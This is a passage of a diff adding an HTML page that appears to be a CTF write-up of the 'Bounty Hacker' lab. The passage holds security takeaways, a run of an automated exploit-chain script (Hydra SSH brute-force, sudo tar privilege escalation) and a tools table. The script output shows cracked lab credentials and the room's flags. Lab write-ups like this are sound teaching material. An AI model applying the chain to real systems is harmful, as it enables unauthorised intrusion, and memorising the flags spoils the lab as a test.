+                    <div class="takeaway-title">Enforce Strong Credentials</div>
+                    <div class="takeaway-text">
+                        The SSH password fell to a 26-entry custom wordlist. Use key-based auth
+                        or enforce complexity requirements and account lockout.
+                    </div>
+                </div>
+                <div class="takeaway-card">
+                    <div class="takeaway-icon"><i class="fas fa-lock"></i></div>
+                    <div class="takeaway-title">Audit sudo Rules Against GTFOBins</div>
+                    <div class="takeaway-text">
+                        <code>tar</code>&rsquo;s <code>--checkpoint-action</code> flag makes it a trivial
+                        privesc vector. Cross-reference all sudo binaries with GTFOBins before deployment.
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- EXPLOIT SCRIPT -->
+        <section class="writeup-section">
+            <div class="step-header">
+                <div class="step-num"><i class="fas fa-file-code" style="font-size:.55rem"></i></div>
+                <div>
+                    <div class="step-label">Automation</div>
+                    <h2 class="step-title">Full-Chain Exploit Script</h2>
+                </div>
+            </div>
+
+            <p>
+                The complete chain is automated in <code>bounty_hacker.sh</code> &mdash; dependency
+                check, nmap recon, FTP extraction, Hydra brute-force, SSH flag retrieval, and sudo
+                tar privilege escalation.
+            </p>
+
+            <div class="code-block">
+                <div class="code-bar">
+                    <span class="code-lang">BASH</span>
+                    <button class="code-copy" onclick="copyCode(this)">Copy</button>
+                </div>
+<pre><span class="cmd-p">$</span> chmod +x bounty_hacker.sh
+<span class="cmd-p">$</span> ./bounty_hacker.sh 10.48.146.252
+
+<span class="out-line">[+] Task author : lin</span>
+<span class="out-line">[+] Wordlist    : locks.txt (26 entries)</span>
+<span class="out-line">[+] SSH credentials &mdash; lin : RedDr4gonSynd1cat3</span>
+<span class="out-line" style="color:var(--aqua);">[+] user.txt &rarr; THM{CR1M3_SyNd1C4T3}</span>
+<span class="out-line" style="color:var(--aqua);">[+] root.txt &rarr; THM{80UN7Y_h4cK3r}</span></pre>
+            </div>
+
+            <p>
+                <a href="https://github.com/0xb0rn3/CTFS/tree/main/THM/Bounty_Hacker" target="_blank" class="gh-link">
+                    <i class="fab fa-github"></i> View source on GitHub
+                </a>
+            </p>
+        </section>
+
+        <!-- TOOLS -->
+        <section class="writeup-section">
+            <div class="step-header">
+                <div class="step-num"><i class="fas fa-wrench" style="font-size:.55rem"></i></div>
+                <div>
+                    <div class="step-label">Arsenal</div>
+                    <h2 class="step-title">Tools Used</h2>
+                </div>
+            </div>
+
+            <div class="vuln-table-wrap">
+                <table class="vuln-table">
+                    <thead>
+                        <tr><th>Tool</th><th>Purpose</th></tr>
+                    </thead>
+                    <tbody>
+                        <tr><td><code>nmap</code></td><td>Port scanning and service enumeration</td></tr>
+                        <tr><td><code>ftp</code></td><td>Anonymous FTP file retrieval</td></tr>
+                        <tr><td><code>hydra</code></td><td>SSH credential brute-force</td></tr>
+                        <tr><td><code>sshpass</code></td><td>Non-interactive SSH authentication</td></tr>
+                        <tr><td><code>tar</code></td><td>Privilege escalation (GTFOBins checkpoint abuse)</td></tr>
+                        <tr><td><code>bounty_hacker.sh</code></td><td>Full-chain automated exploit (Bash)</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </section>
+
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <p class="footer-text">
+            <span>[0xb0rn3]</span> &middot; CTF Writeup &middot; Bounty Hacker &middot;
+            <span>THM{80UN7Y_h4cK3r}</span>
+        </p>
+    </footer>
+
+    <button class="scroll-top" id="scrollTop" aria-label="Scroll to top">
+        <i class="fas fa-chevron-up"></i>
+    </button>
+
+    <script>
+    'use strict';
+
+    const scrollBar = document.getElementById('scrollBar');
+    const navbar = document.getElementById('navbar');
+    const scrollTop = document.getElementById('scrollTop');
+
+    window.addEventListener('scroll', () => {
+        const h = document.documentElement.scrollHeight - window.innerHeight;
+        scrollBar.style.width = ((window.scrollY / h) * 100) + '%';
+        navbar.classList.toggle('scrolled', window.scrollY > 50);
+        scrollTop.classList.toggle('show', window.scrollY > 400);
+    }, { passive: true });
+
+    scrollTop.addEventListener('click', () => window.scrollTo({ top: 0, behavior: 'smooth' }));
+
+    const io = new IntersectionObserver(entries => {
+        entries.forEach((e, i) => {
+            if (e.isIntersecting) {
+                e.target.style.transitionDelay = `${i * 60}ms`;
+                e.target.classList.add('visible');
+                io.unobserve(e.target);
+            }
+        });
+    }, { threshold: .05, rootMargin: '0px 0px -30px 0px' });
+
+    document.querySelectorAll('.writeup-section').forEach(el => io.observe(el));
+
+    function copyCode(btn) {
+        const code = btn.closest('.code-block').querySelector('pre').textContent;
+        navigator.clipboard.writeText(code).then(() => {
+            btn.textContent = 'Copied!';
+            btn.classList.add('copied');
+            setTimeout(() => {
+                btn.textContent = 'Copy';
+                btn.classList.remove('copied');
+            }, 2000);
+        });
+    }
+    </script>
+
+</body>
+</html>
